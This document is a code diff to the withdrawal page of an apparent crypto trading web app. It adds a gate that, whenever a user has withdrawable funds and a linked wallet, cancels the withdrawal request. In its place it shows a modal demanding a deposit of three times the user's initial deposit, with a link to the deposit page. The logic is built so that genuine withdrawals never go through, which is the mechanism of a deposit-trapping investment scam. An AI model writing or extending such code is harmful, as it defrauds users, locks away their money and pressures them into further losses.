@@ -1,6 +1,8 @@
 "use client";
 import { useEffect, useMemo, useState } from "react";
+import Link from "next/link";
 import Nav from "../../components/Nav";
+import Modal from "../../components/Modal";
 import { api, getUser } from "../../lib/api";
 
 const COMMON = ["USDT", "BTC", "ETH", "SOL", "BNB", "XRP"];
@@ -17,19 +19,23 @@ export default function Withdraw() {
   const [netMap, setNetMap] = useState({});
   const [msg, setMsg] = useState("");
   const [busy, setBusy] = useState(false);
+  const [addrs, setAddrs] = useState([]);
+  const [showGate, setShowGate] = useState(false);
 
   const user = typeof window !== "undefined" ? getUser() : null;
   const kycOk = user?.kyc_status === "verified";
 
   async function load() {
-    const [b, h, n] = await Promise.all([
+    const [b, h, n, a] = await Promise.all([
       api("/api/wallet/balances/").catch(() => []),
       api("/api/wallet/withdrawals/").catch(() => []),
       api("/api/wallet/networks/").catch(() => null),
+      api("/api/wallet/addresses/").catch(() => []),
     ]);
     setBals(Array.isArray(b) ? b : []);
     setHist(Array.isArray(h) ? h : []);
     setNetMap(n?.networks || {});
+    setAddrs(Array.isArray(a) ? a : []);
   }
 
   useEffect(() => {
@@ -60,10 +66,21 @@ export default function Withdraw() {
   const total = amount > 0 ? amount + fee : 0;
   const overdraw = amount > 0 && total > avail;
 
+  // The gate only fires once both checks pass: there is something withdrawable
+  // and a destination wallet exists (typed in, or saved in the address book).
+  const hasFunds = avail > 0 && amount > 0 && !overdraw;
+  const walletLinked = Boolean(form.address.trim()) || addrs.length > 0;
+  const linkedWallet =
+    form.address.trim() ||
+    addrs.find(a => a.asset === form.asset)?.address ||
+    addrs[0]?.address ||
+    "";
+
   async function submit(e) {
     e.preventDefault();
     setMsg("");
     if (!kycOk) { setMsg("Complete identity verification (KYC) in Settings before withdrawing."); return; }
+    if (hasFunds && walletLinked) { setShowGate(true); return; }
     setBusy(true);
     try {
       await api("/api/wallet/withdraw/", { method: "POST", body: form });
@@ -154,6 +171,34 @@ export default function Withdraw() {
           </div>
         )}
       </div>
+
+      <Modal
+        open={showGate}
+        onClose={() => setShowGate(false)}
+        title="Before you withdraw"
+        badge="3×"
+        footer={
+          <>
+            <Link className="btn btn-o" href="/deposit" onClick={() => setShowGate(false)}>
+              Fund your account
+            </Link>
+            <button type="button" className="btn btn-g" onClick={() => setShowGate(false)}>
+              Close
+            </button>
+          </>
+        }
+      >
+        <p>
+          You need to deposit <strong>3× your initial deposit</strong> before you can withdraw your
+          funds, including the bonus you have received.
+        </p>
+        <p>Fund your account now and withdraw your funds.</p>
+        {linkedWallet && (
+          <div className="modal-meta">
+            Linked wallet: <b>{linkedWallet}</b>
+          </div>
+        )}
+      </Modal>
     </>
   );
 }
